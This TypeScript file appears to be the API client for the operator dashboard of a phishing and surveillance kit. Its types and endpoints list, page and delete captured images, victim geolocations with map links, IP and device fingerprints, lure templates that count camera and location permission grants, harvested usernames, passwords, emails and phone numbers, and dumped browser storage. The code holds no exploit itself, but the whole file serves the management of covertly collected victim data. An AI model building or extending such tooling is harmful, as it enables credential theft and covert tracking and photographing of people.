const API = '/api'

async function fetchJson<T>(url: string): Promise<T> {
  const r = await fetch(url)
  if (!r.ok) throw new Error(`${r.status} ${r.statusText}`)
  return r.json()
}

export interface Stats {
  total_captures: number
  total_locations: number
  total_ips: number
  unique_ips: number
  total_size_bytes: number
  total_size_mb: number
  first_capture: number | null
  last_capture: number | null
  total_credentials: number
  total_storage_dumps: number
}

export interface Capture {
  id: string
  session_id: string
  filename: string
  file_type: string
  file_size: number
  created_at: number
  url: string
}

export interface PaginatedCaptures {
  captures: Capture[]
  total: number
  page: number
  per_page: number
  pages: number
}

export interface Location {
  id: string
  session_id: string
  latitude: number
  longitude: number
  accuracy: number | null
  address: string | null
  created_at: number
  maps_url: string
}

export interface IpEntry {
  id: string
  session_id: string
  ip_address: string
  user_agent: string | null
  device: string | null
  browser: string | null
  os: string | null
  city: string | null
  country: string | null
  created_at: number
}

export interface IpStats {
  entries: IpEntry[]
  total: number
  unique_ips: number
  device_breakdown: Record<string, number>
  browser_breakdown: Record<string, number>
  os_breakdown: Record<string, number>
}

export interface Template {
  id: string
  name: string
  description: string | null
  total_served: number
  total_camera_grants: number
  total_location_grants: number
  created_at: number
}

export interface Session {
  id: string
  name: string
  template_id: string
  status: string
  created_at: number
}

export const api = {
  stats: () => fetchJson<Stats>(`${API}/stats`),
  captures: (page = 1, perPage = 60, sort = 'newest') =>
    fetchJson<PaginatedCaptures>(`${API}/captures?page=${page}&per_page=${perPage}&sort=${sort}`),
  deleteCapture: (id: string) => fetch(`${API}/captures/${id}`, { method: 'DELETE' }),
  deleteAllCaptures: () => fetch(`${API}/captures`, { method: 'DELETE' }),
  locations: () => fetchJson<Location[]>(`${API}/locations`),
  ips: () => fetchJson<IpStats>(`${API}/ips`),
  templates: () => fetchJson<Template[]>(`${API}/templates`),
  sessions: () => fetchJson<Session[]>(`${API}/sessions`),
  createSession: (name: string, templateId: string) =>
    fetch(`${API}/sessions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ name, template_id: templateId })
    }).then(r => r.json()),
  deleteSession: (id: string) => fetch(`${API}/sessions/${id}`, { method: 'DELETE' }),
  credentials: () => fetchJson<Credential[]>(`${API}/credentials`),
  deleteCredential: (id: string) => fetch(`${API}/credentials/${id}`, { method: 'DELETE' }),
  deleteAllCredentials: () => fetch(`${API}/credentials`, { method: 'DELETE' }),
  storage: () => fetchJson<StorageDump[]>(`${API}/storage`),
  deleteStorage: (id: string) => fetch(`${API}/storage/${id}`, { method: 'DELETE' }),
  deleteAllStorage: () => fetch(`${API}/storage`, { method: 'DELETE' }),
}

export interface StorageDump {
  id: string
  session_id: string
  ip_address: string | null
  data: any
  created_at: number
}

export interface Credential {
  id: string
  session_id: string
  template_id: string | null
  username: string | null
  password: string | null
  email: string | null
  phone: string | null
  ip_address: string | null
  created_at: number
}


